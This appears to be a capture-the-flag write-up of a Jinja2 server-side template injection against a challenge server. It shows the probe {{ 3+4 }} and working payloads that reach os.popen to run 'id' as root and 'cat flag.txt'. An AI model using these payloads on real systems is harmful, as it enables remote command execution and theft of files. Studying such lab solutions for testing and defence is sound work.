# Solution

We play around with the url and we see that the webserver is vulnerable to Server Side injection due to a lack of input escaping when using the Jinja2 Template. It is in fact possible to inject server side commands.  

We can sense the mistake by looking at how the template replies to a specific url request.  
If we browse 206.189.121.131:32323/hello , the web server replies with
```
The page 'hello' could not be found
```

The relative path we look for is replied back from the server. We can thus try to see if we can activate some of the Jinja2 langiage features
```
206.189.121.131:32323/{{ 3+4 }}
```
As a response we get
```
The page '7' could not be found
```

We thus have code execution. We can try with something more dangerous. 
```
206.189.121.131:32323/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
As a response we get The page 'uid=0(root) gid=0(root) groups=0(root) ' could not be found' as expected.

We can now look for the flag and print it
```
206.189.121.131:32323/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

